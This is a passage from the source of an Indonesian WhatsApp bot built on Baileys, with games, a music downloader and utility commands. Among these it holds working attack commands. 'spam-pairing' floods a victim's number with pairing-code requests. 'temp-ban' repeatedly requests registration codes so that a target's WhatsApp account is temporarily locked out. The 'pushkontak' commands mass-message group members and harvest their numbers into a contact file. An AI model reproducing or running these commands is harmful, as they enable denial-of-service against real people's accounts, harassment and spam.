${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
ZetInc.sendtext(from, the2, m)
users[posi.penantang].balance += posi.hadiah
users[posi.ditantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the3 = `*HASIL SERI*

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
ZetInc.sendtext(from, the3, m)

delete tictactoe[from];
} else {
the4 = `@${posi.penantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.ditantang.split('@')[0]}`
ZetInc.sendtext(from, the4, m)

tictactoe[from].status = false
}
}
}
}
} else if (posi.status === false){
if (sender === posi.ditantang){
for (let i of nomor){
if (Number(body) === i){
if (cekIsi(Number(body) - 1, anu)) return reply(`Nomor tersebut sudah terisi`)
tictactoe[from].TicTacToe[Number(body) - 1] = '⭕' 
if (cekTicTac(anu)){
the5 = `@${posi.ditantang.split('@')[0]} Menang

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Hadiah : ${posi.hadiah} balance
Ingin bermain lagi? ${prefix}tictactoe`
ZetInc.sendtext(from, the5, m)
users[posi.ditantang].balance += posi.hadiah
users[posi.penantang].balance -= posi.hadiah
delete tictactoe[from];
} else if (KeisiSemua(anu)) {
the6 = `Hasil Seri

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Ingin bermain lagi? ${prefix}tictactoe`
ZetInc.sendtext(from, the6, m)

delete tictactoe[from];
} else {
the7 = `@${posi.ditantang.split('@')[0]} telah mengisi

@${posi.penantang.split('@')[0]} = ❌
@${posi.ditantang.split('@')[0]} = ⭕

${anu[0]}${anu[1]}${anu[2]}
${anu[3]}${anu[4]}${anu[5]}
${anu[6]}${anu[7]}${anu[8]}

Giliran @${posi.penantang.split('@')[0]}`
ZetInc.sendtext(from, the7, m)

tictactoe[from].status = true
}
}
}
}
}
}
} catch (err){
console.log(chalk.redBright('[ ERROR TICTACTOE ]'), err)
}
}
    
function monospace(string) {
return '```' + string + '```'
}
    
const blacklist = [];

function addToBlacklist(userId) {
    if (!blacklist.includes(userId)) {
        blacklist.push(userId);
    }
}
    
if (prefix && command) {
ZetInc.spam = ZetInc.spam ? ZetInc.spam : {};
//if (m.key.fromMe) return
if (m.sender in ZetInc.spam) {
ZetInc.spam[m.sender].count++;
if (m.messageTimestamp - ZetInc.spam[m.sender].lastspam > 1) {
if (ZetInc.spam[m.sender].count > 1) {
global.db.data.users[m.sender].banned = true;
reply("Jangan spam, kamu dibanned selama 10 detik!");
setTimeout(() => {
 global.db.data.users[m.sender].banned = false;
   reply(`Sekarang kamu bisa chat lagi.`);
  }, 10 * 1000);
 }
ZetInc.spam[m.sender].count = 0;
ZetInc.spam[m.sender].lastspam = m.messageTimestamp;
}
} else {
ZetInc.spam[m.sender] = {
jid: m.sender,
count: 0,
lastspam: 0
};
}
}
    
if (settings.spotifyPlay[m.sender]) {
if (!(m.sender in settings.spotifyPlay)) return;
const { result, key, title } = settings.spotifyPlay[m.sender];
if (!m.quoted || m.quoted.id !== key.id || !m.text) return;
const choice = m.text.trim();
const inputNumber = Number(choice);
if (inputNumber >= 1 && inputNumber <= result.length) {
ZetInc.sendMessage(m.chat, { react: { text: '⏳', key: m.key }})
const selectedTrack = result[inputNumber - 1];
try {
const start = new Date();
let res = await spotifydll(selectedTrack.link)
let audioLink = res.download
const timeTaken = ((new Date() - start) / 1000).toFixed(2) + ' seconds';

const durationInSeconds = Math.floor(selectedTrack.duration_ms / 1000);
const minutes = Math.floor(durationInSeconds / 60);
const seconds = durationInSeconds % 60;
const durationText = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
const thumbnail = selectedTrack.image;                       
await ZetInc.sendMessage(m.chat, {
audio: {
url: `${audioLink}`
},
mimetype: 'audio/mp4', 
fileName: `${title}.mp3`,
contextInfo: {
externalAdReply: {
showAdAttribution: false,
mediaType: 1,
title: 'SPOTIFY - MUSIC',
body: '',
thumbnailUrl: 'https://telegra.ph/file/ab0adc695a83b0bf7ed54.jpg',
renderLargerThumbnail: false
}}},{ quoted: m})
            // Delete number list
await ZetInc.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
ZetInc.sendMessage(m.chat, { delete: key });
delete settings.spotifyPlay[m.sender];
} catch (error) {
console.error('Error downloading and sending audio:', error);
await ZetInc.reply(m.chat, 'An error occurred while downloading and sending audio.', m);
ZetInc.sendMessage(m.chat, { react: { text: '🚫', key: m.key }})
}
} else {
await ZetInc.reply(m.chat, "Nomor urut tidak valid. Silakan pilih nomor yang sesuai dengan daftar di atas.", m);
ZetInc.sendMessage(m.chat, { react: { text: '🚫', key: m.key }})
}
}
    
function getRandomint(min, max) {
	min = Math.ceil(min);
	max = Math.floor(max);
	return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (m && m.text && typeof m.text === 'string') {
let users = global.db.data.users[sender];
if (users) {
//if (m.key.fromMe) return
if (!m.isGroup && users.isVerifying && /(\d{3}-\d{3})/.test(m.text) && !users.registered) {
let lowerCaseText = m.text.toLowerCase();
let lowerCaseCode = users.code ? users.code.toLowerCase().trim() : '';
if (lowerCaseText === lowerCaseCode) {
if (new Date() - users.codeExpire > 180000) { // 3 menit
ZetInc.reply(m.chat, '🚩 Your verification code has expired.', m).then(() => {
users.codeExpire = 0;
users.code = '';
users.email = '';
users.isVerifying = false; // Reset flag
});
} else {
ZetInc.reply(m.chat, `✅ Your number has been successfully verified (+10 limit), type "ceksn" to get the serial number ( SN ) code`, m).then(() => {
users.codeExpire = 0;
users.code = '';
users.registered = true;
if (typeof global.db.data.users[m.sender].limit === 'number') {
global.db.data.users[m.sender].limit += 10;
} else {
global.db.data.users[m.sender].limit = 10;
}
users.isVerifying = false; // Reset flag
});
}
} else {
ZetInc.reply(m.chat, '🚩 Your verification code is incorrect.', m);
}
} else if (users.isVerifying) {
ZetInc.reply(m.chat, '🚩 You need to use the correct verification code.', m);
}
} else {
console.error('Users object is undefined');
}
} else {
//console.error('m or m.text is not defined or not a string');
}

    
switch (command) {

case'panel':{
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const formattedTotalMem = formatSize(totalMem);
if (args[0] === "pterodactyl") {
return zreply(`hi @${m?.sender.split('@')[0]} 🪸, i am an automated system (WhatsApp bot) that can help to do something search and get data / information only through WhatsApp.

▧  ${Kyuu}Info Bot${Kyuu}
│ • Total Pengguna : ${pendaftar.length} User
│ • Info : Case X Plugin
│ • Baileys : whiskeysockets
│ • RAM : ${formattedUsedMem} / ${formattedTotalMem}
│ • Date : ${new Date().toLocaleString()}
└───···

${Kyuu}Info User${Kyuu}
* Limit : ${limitnya} Limit
* Status : ${isCreator ? "Owner" : "User"}
* User : ${isPremium ? 'Premium' : 'Free'}

▧  *P A N E L  P T E R O D A C T Y L*
│ • ${prefix}buypanel
│ • ${prefix}delpanel
│ • ${prefix}delusr
│ • ${prefix}delsrv
│ • ${prefix}listpanel
└───···
`)
}}
break
     
case'menu':{
ZetInc.sendReact(m.chat, "🕊️", m.key )
await sleep(2000)
if (args.length < 1) return zreply(`${menuu(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
if (args[0] === 'all') {
return zreply(`${menuall(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'owner') {
return zreply(`${menuowner(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'bug') {
return zreply(`${attack(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'ai') {
return zreply(`${menuai(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'download') {
return zreply(`${menudownload(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'pushkontak') {
return zreply(`${menugroup(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'tools') {
return zreply(`${menutools(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'converter') {
return zreply(`${menuconvert(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'game') { 
return zreply(`${menugame(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'islamic') {
return zreply(`${menuislamic(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
} else if (args[0] === 'ephoto') {
return zreply(`${menuephoto(prefix, m, pendaftar, command, sender, formattedUsedMem, formattedTotalMem, limitnya, isCreator, isPremium, pushname)}`)
}
}
break
        
case'decrypt':{
let text;
if (args.length >= 1) {
    text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
    text = m.quoted.text;
} else {
    return reply(`*Example:* ${prefix + command} (Input text or reply text to enc code)`);
}

try {
const message = await Decrypt(text);
await reply(message);
    
} catch (error) {
const errorMessage = `Terjadi kesalahan: ${error.message}`;
await reply(errorMessage);
}
}
break   
        
case'sendkatalog':{
let t = text.split(' ');
if (!isCreator) return reply(mess.owner)
if (t.length < 2) return reply(`*Example*: ${prefix + command} user nomer`)
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!/image/.test(mime)) return reply("teksnya dengan balas/kirim foto")
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n> *Example*: ${prefix + command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
let imagee = await ZetInc.downloadAndSaveMediaMessage(qmsg)
 const uploadFile = { upload: ZetInc.waUploadToServer };
        var imageMessage = await prepareWAMessageMedia(
          {
            image: {  url: imagee },
          },
          uploadFile,
        );
        const product = {
          productImage: imageMessage.imageMessage,
          productId: "7066960336725723",
          title: text,
          description: "Nyari Apa Dek?",
          currencyCode: "IDR",
          priceAmount1000: "160000000",
          productImageCount: 1,
        };
        const productData = {
          product: product,
          businessOwnerJid: "6282318658612@s.whatsapp.net",
        };
        const productMessage = { productMessage: productData };
        var response = await generateWAMessageFromContent(
          from,
          proto.Message.fromObject(productMessage),
          m.quoted && m.quoted.fromMe
            ? { contextInfo: { ...m.msg.contextInfo } }
            : { quoted: m },
        );
        await ZetInc.relayMessage(target, response.message, {
          messageId: response.key.id,
        });
}
    break
        
case'searchsubdo':{
if (!text) return ZetInc.reply(m.chat, 'Harap masukkan domain utama yang ingin dicari subdomainnya.', m);

const domain = text.trim().replace(/^https?:\/\//, '');
async function searchSubdomains(domain) {
    const url = `https://crt.sh/?q=${domain}&output=json`;
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        const subdomains = data.map(entry => entry.name_value);
        const uniqueSubdomains = [...new Set(subdomains)];
        uniqueSubdomains.sort();
        
        return uniqueSubdomains;
    } catch (error) {
        console.error('Error fetching subdomains:', error);
        return null;
    }
}
const subdomains = await searchSubdomains(domain);

if (subdomains) {
const message = subdomains.join('\n* ');
const total = subdomains.length;
ZetInc.reply(m.chat, `Ditemukan ${total} subdomain untuk ${domain}:\n\n${message}`, m);
} else {
ZetInc.reply(m.chat, 'Tidak ada hasil yang ditemukan atau terjadi kesalahan.', m);
}
};
break       
        
case'trackip':{
if (!text) return reply(`*Example:* ${prefix + command} 112.90.150.204`);
try {
let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

const formatIPInfo = (info) => {
  return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
  - Image: ${info.flag?.img || 'N/A'}
  - Emoji: ${info.flag?.emoji || 'N/A'}
  - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
  - ASN: ${info.connection?.asn || 'N/A'}
  - Organization: ${info.connection?.org || 'N/A'}
  - ISP: ${info.connection?.isp || 'N/A'}
  - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
  - ID: ${info.timezone?.id || 'N/A'}
  - Abbreviation: ${info.timezone?.abbr || 'N/A'}
  - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
  - Offset: ${info.timezone?.offset || 'N/A'}
  - UTC: ${info.timezone?.utc || 'N/A'}
  - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
};
    
if (!res.success) throw new Error(`IP ${text} not found!`);
await ZetInc.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
await delay(2000);
ZetInc.reply(m.chat, formatIPInfo(res), m);  
} catch (e) { 
ZetInc.reply(m.chat, e.message || `Error: Unable to retrieve data for IP ${text}`, m);
}
}
break

case'vocal':{
let q = m.quoted ? m.quoted : m;
let mime = (q.msg || q).mimetype || '';
if (!/audio/.test(mime)) return reply(`Reply to an audio message with the command: *${prefix + command}*`);
try {      
let audio = await q.download();
if (!audio) return reply('Cannot download audio!');
const { vocalRemoverr } = require('./lib/vocal')
let z = await vocalRemoverr(audio);
ZetInc.sendFile(m.chat, z.instrumental_path, null, null, instrumen);
ZetInc.sendFile(m.chat, z.vocal_path, null, null, vocal);
        
} catch (e) {
console.error(e);
reply(e.message || 'An error occurred during the audio processing.');
}
};
break
        
case "setmenu":{
if (!isCreator) return reply (mess.owner)
if (!text) return reply(`There are 4 reply(v1,v2,v3 v4)\nPlease select 1\n*Example:* ${prefix + command} v1`);
if (text.startsWith("v")) {
typereply = text;
reply("success");
} else {
reply(`There are 4 reply(v1,v2,v3,v4)\nPlease select 1\n*Example:* ${prefix + command} v1`);
}}
break;
        
case 'toptv':{
const { toPTT } = require('./lib/converter')
const { MessageType } = require('@whiskeysockets/baileys')
let q = m.quoted ? m.quoted : m
if (!/video|audio/.test(mime)) throw `Balas video atau voice note yang ingin diubah ke mp3 dengan caption *${prefix + command}*`
let media = await q.download()
let dataVideo = { ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage }
ZetInc.relayMessage(m.chat, dataVideo, {})
}
break
        
case'stext':{
if (!text) return reply(`*Example:* ${prefix + command} Tes`)
ZetInc.sendReact(m.chat, "🕛", m.key )
let uploadImage = require ("./lib/uploadImage")
let json = {
type: 'stories',
format: 'png',
backgroundColor: '#1b1e23',
width: 512,
height: 720,
scale: 4,
watermark: 'kyuurzy.tech',
messages: [{
entities: 'auto',
avatar: true,
from: {
id: 18,
name: await ZetInc.getName(m.sender),
photo: {
url: await ZetInc.profilePictureUrl(m.sender, 'image').catch(_ => "https://telegra.ph/file/320b066dc81928b782c7b.png")}},
text: text }, 
]};
const { data } = await axios.post('https://dikaardnt.com/api/maker/quote', json);
var media = Buffer.from(data.image, 'base64')
var res = await uploadImage(media)
ZetInc.sendReact(m.chat, "✅", m.key )
ZetInc.sendMessage(m.chat, { image: { url:res }, caption: ''},{quoted: m })
}
break

case "spam-pairing": {
if (!isCreator) return reply(mess.owner)
if (!q) return reply(`*Example:* ${prefix + command} +6288888888888|150`)
let [targetNumber, attemptCount = "100"] = q.split("|")
let sanitizedPhoneNumber = targetNumber.replace(/[^0-9]/g, '').trim()
let attempts = parseInt(attemptCount)
if (isNaN(attempts)) return reply('Jumlah percobaan harus berupa angka.')

async function spamPairingRequest(sanitizedPhoneNumber, attempts) {
const startTime = Date.now();
const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
        
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('.npm')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

while (Date.now() - startTime < duration) {
let currentAttempts = attempts; // reset attempts per loop
while (currentAttempts > 0) {
try {
const prc = await sucked.requestPairingCode(sanitizedPhoneNumber);
console.log(`_Succes Spam Pairing Code - Number: ${sanitizedPhoneNumber} - Code: ${prc}_`);
} catch (error) {
console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
}
                
console.log(`Spam Pairing WhatsApp: ${currentAttempts} percobaan tersisa...`);
await new Promise(resolve => setTimeout(resolve, 1000)); // 1 detik per iterasi
currentAttempts--;
}

console.log('Mengirim ulang dalam 30 detik...');
await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
}

console.log('Selesai. 15 menit telah berlalu.');
}

await spamPairingRequest(sanitizedPhoneNumber, attempts);
}
break;

case'ai':{
ZetInc.renvy = ZetInc.renvy ? ZetInc.renvy : {};
if (!text) return reply(`*Example:* ${prefix + command} *[on/off]*`);
if (text == "on") {
ZetInc.renvy[m.sender] = {
pesan: [],
};
return reply("[ ✓ ] Success create session chat");
} else if (text == "off") {
delete ZetInc.renvy[m.sender];
return reply("[ ✓ ] Success delete session chat");
}
};
break      
        
case 'delsesi':
case 'clear':
case 'ds':
case 'clearsession':{
if (!isCreator) return reply(mess.owner)
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
reply(`Berhasil Menghapus ${filteredArray.length} file sampah...`)
});
if (args[0] === "backup") {
await sleep(5000)
reply("Proses Backup")
await sleep(5000)
const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await ZetInc.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "backup.zip",},{quoted: m}); await execSync("rm -rf backup.zip");
}
}
break
        
case 'temp-ban': {
if (!isCreator) return
if (!text) return reply(`*Example:* ${prefix + command} 62|87872627288`)
if (!/|/.test(text)) return reply(`Wrong Usage!!!:\n> *Example:* ${prefix + command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await reply(`Successfully Temporarily Block WhatsApp with number : ${fullNo} Using Commands ${command} Indefinitely this glitch will come back when the bot restarts!!!`)

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
let pino = require("pino")
let { state, saveCreds } = await useMultiFileAuthState('.npm')
let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724
})

if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break
        
case'cekidch':{
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return reply('Balas pesan dari saluran admin channel nya');

try {
let quotedMessage = await m.getQuotedObj();
let id = quotedMessage.msg.contextInfo.forwardedNewsletterMessageInfo;

if (id) {
await reply(`*Sumber* : ${id.newsletterName}\n*ID*: ${id.newsletterJid}`);
} else {
return reply('Informasi saluran tidak ditemukan.');
}
} catch (e) {
return reply('Harus balas pesan dari saluran ya..');
}}
break

case'blackbox':{
if (!text && !m.quoted) return reply(`*Example:* ${prefix + command} Siapakah Presiden Indonesia`);
const blackbox = new Blackbox();

if (text && m.quoted && (m.quoted.mimetype === 'image/jpeg' || m.quoted.mimetype === 'image/png')) {
const buffer = await m.quoted.download();
const response = await blackbox.image(buffer, text);
await reply(response);
} else if (text) {
const response = await blackbox.combinedResponse(text, `Kamu adalah Blackbox AI bukan AI lain dan ownermu adalah KyuuRzy. Kamu berbicara dengan ${pushname}.`);
await reply(response);
}
}
break

case "pushkontak": {
if (!isCreator) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
if (!text) return reply(`*Example:* ${prefix + command} Tes`)
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delaypushkontak * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await ZetInc.sendMessage(mem, {text: teks}, {quoted: tes})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await ZetInc.sendMessage(m.sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./lib/database/contacts.vcf", "")
}}
break
        
case "pushkontak1": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix+ command} idgrup|pesannya`)
if (!text.split("|")) return reply(`*Example:* ${prefix + command} idgrup|pesannya`)
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await ZetInc.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delaypushkontak * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await ZetInc.sendMessage(mem, {text: teks}, {quoted: tes})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await ZetInc.sendMessage(m.sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./lib/database/contacts.vcf", "")
}}
break
        
case "pushkontak2": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} idgc|jeda|pesan`)
if (!text.split("|")) return reply(`*Example:* ${prefix + command} idgc|jeda|pesan`)
var idnya = text.split("|")[0]
var delay = Number(text.split("|")[1])
var teks = text.split("|")[2]
if (!idnya.endsWith("@g.us")) return reply("Format ID Grup Tidak Valid")
if (isNaN(delay)) return reply("Format Delay Tidak Valid")
if (!teks) return reply(`*Example:* ${prefix + command} idgc|jeda|pesan`)
var groupMetadataa
try {
groupMetadataa = await ZetInc.groupMetadata(`${idnya}`)
} catch (e) {
return reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let time = ms(delay * Number(halls.length))
await reply(`Memproses Mengirim Pesan Ke *${halls.length} Member Grup*`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await ZetInc.sendMessage(mem, {text: teks}, {quoted: tes})
await sleep(Number(delay))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./lib/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
reply(err.toString())
} finally {
if (m.chat !== m.sender) await reply(`File Kontak Berhasil Dikirim ke Private Chat\n*Total ${halls.length} Kontak*`)
await ZetInc.sendMessage(m.sender, { document: fs.readFileSync("./lib/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File Kontak Berhasil Di Buat ✅\nTotal ${halls.length} Kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./lib/database/contacts.vcf", "")
}}
break
        
case "idgc": {
if (!isCreator) return reply(mess.owner)
if (!isGroup) return reply(mess.group)
reply(`${m.chat}`)
}
break
        
case "listgc": case "cekidgc": case"listgrup": {
if (!isCreator) return reply(mess.owner)
let gcall = Object.values(await ZetInc.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
ZetInc.sendMessage(m.chat, {
text: `${listgc}`, 
contextInfo: {
mentionedJid: [m.sender], 
externalAdReply: {
thumbnail: await getBuffer(ppuser), 
title: `[ ${gcall.length} Group Chat ] `, 
body: `Runtime : ${runtime(process.uptime())}`,
sourceUrl: global.url, 
previewType: "PHOTO"}
}}, {quoted: tes})
}
break
        
case "joingc": case "join": {
if (!isCreator) return reply(mess.owner)
if (!text && !m.quoted) return reply(`*Example:* ${prefix + command} Url Link Group`)
let teks = m.quoted ? m.quoted.text : text
if (!teks.includes('whatsapp.com')) return reply("Invalid Link!")
let result = teks.split('https://chat.whatsapp.com/')[1]
await ZetInc.groupAcceptInvite(result).then(respon => reply("* Successfully Entered Into Group Chat")).catch(error => reply(error.toString()))
}
break
        
case 'spotify': {
if (!text) return reply(`*Example:* ${prefix + command} bohongi hati`);
ZetInc.sendMessage(m.chat, { react: { text: '🎧', key: m.key }})
const result = await searchSpotify(text);
const title = result.name
let responseText = '[❗] Balas pesan ini dengan nomor untuk mendapatkan lagunya.\n\n';
result.forEach((track, index) => {
